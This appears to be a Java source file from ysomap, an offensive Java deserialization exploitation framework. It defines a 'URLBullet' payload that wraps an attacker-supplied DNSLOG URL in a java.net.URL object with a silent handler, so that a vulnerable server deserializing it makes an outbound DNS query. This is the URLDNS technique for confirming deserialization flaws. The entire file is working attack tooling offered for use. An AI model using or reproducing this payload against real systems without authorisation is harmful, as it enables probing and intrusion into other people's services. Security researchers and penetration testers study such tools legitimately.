package ysomap.bullets.jdk;

import ysomap.bullets.AbstractBullet;
import ysomap.common.annotation.*;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;

/**
 * @author wh1t3P1g
 * @since 2020/2/23
 */
@Bullets
@Authors({Authors.WH1T3P1G})
@Details("向外部发起DNS查询，配合DNSLOG使用")
@Targets({Targets.JDK})
@Dependencies({"jdk"})
public class URLBullet extends AbstractBullet<URL> {

    @NotNull
    @Require(name = "dnslog", detail = "set a dnslog url")
    private String dnslog;

    @Override
    public URL getObject() throws Exception {
        //Avoid DNS resolution during payload creation
        //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
        URLStreamHandler handler = new SilentURLStreamHandler();
        return new URL(null, dnslog, handler); // URL to use as the Key
    }

    public static URLBullet newInstance(Object... args) throws Exception {
        URLBullet bullet = new URLBullet();
        bullet.set("dnslog", args[0]);
        return bullet;
    }

    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}
